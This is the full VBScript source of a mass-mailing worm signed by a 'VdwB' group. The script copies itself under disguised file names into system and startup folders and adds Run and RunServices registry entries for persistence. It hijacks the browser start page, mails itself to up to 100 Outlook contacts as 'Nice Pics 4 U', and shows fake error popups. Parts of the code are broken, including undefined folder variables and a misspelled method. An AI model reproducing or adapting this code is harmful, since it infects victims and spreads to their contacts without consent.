On Error Resume Next

' Don't steal my code
' Only u are a lamer ;)
' greez go to all VdwB-Member and the hole world
' cu -=[VdwB-Master_C.]=-
'
' ##################################################
' # VdwB Ru13z 4 3v3r !!! Gr33z 70 411 C0d3rz 0f th3 W0r1d. #
' ##################################################

Dim Wurm
Dim Source
Dim ReG
Dim Counter
Dim OL
Dim Num
Dim Round

Set Wurm = CreateObject("Scripting.FileSystemObject")
Set Source = Wurm.GetFile(WScript.ScriptFullName)
Source.Copy(DirSystem&"\MSKernel32.vbs")
Source.Copy(DirWin&"\Win32Dll.vbs")
Source.Copy(DirSystem&"\Win16Dll.vbs")
Source.Copy(DirSystem&"\MasterInside.vbs")
Source.Copy(DirTemp&"\NicePics.jpg.vbs")

Source.Copy(DirWin&"\Startmen��\Programme\Autostart\MasterIndside.txt..vbs")
Source.Copy(DirWin&"\Startmen��\Programme\Autostart\MSKernel32.sys..vbs")
Source.Copy(DirWin&"\Startmen��\Programme\Autostart\Win32Dll.dll.vbs")
Source.Copy(DirWin&"\Startmen��\Programme\Autostart\Win16Dll.dll..vbs")
Source.Copy(DirWin&"\Startmen��\Programme\Autostart\NicePics.jpg.vbs")

Set ReG = CreateObject("WScript.Shell")
ReG.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & "MasterInside", Wurm.BuildPath( DirSystem, "MasterInside.vbs" )
ReG.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & "MSKernel32", Wurm.BuildPath( DirSystem, "MSKernel32.vbs" )
ReG.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & "Win32Dll", Wurm.BuildPath( DirSystem, "Win32Dll.vbs" )
ReG.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & "Win16Dll", Wurm.BuildPath( DirSystem, "Win16Dll.vbs" )
ReG.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & "NicePics", Wurm.BuildPath( DirSystem, "NicePics.jpg.vbs" )

ReG.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\" & "MasterInside", Wurm.BuildPath( DirSystem, "MasterInside.vbs" )
ReG.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\" & "MSKernel32", Wurm.BuildPath( DirSystem, "MSKernel32.vbs" )
ReG.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\" & "Win32Dll", Wurm.BuildPath( DirSystem, "Win32Dll.vbs" )
ReG.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\" & "Win16Dll", Wurm.BuildPath( DirSystem, "Win16Dll.vbs" )
ReG.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\" & "NicePics", Wurm.BuildPath( DirSystem, "NicePics.jpg.vbs" )

ReG.RegWrite "HKCU\Software\Microsoft\InternetExplorer\Main\StartPage","http://www.vdwb.eu.tc/master_infected.htm"

Set OL = CreateObject("Outlook.Application")
Set Mail = OL.CreateItem(0)
For Counter=1 To 100
Mail.to=OL.GetNameSpace("MAPI").AddressLists(1).AddressEntries(Counter)
Mail.Subject="Nice Pics 4 U"
Mail.Body="Only open the file and enjoy :)"
Mail.Attachmets.Add(DirTemp&"\NicePics.jpg.vbs")
Mail.Send
Next
OL.Quit

Randomize Timer
Round = int(Rnd*25)+1 
For Num=0 To Round
MsgBox "Win32 error! Please reboot your system."
Next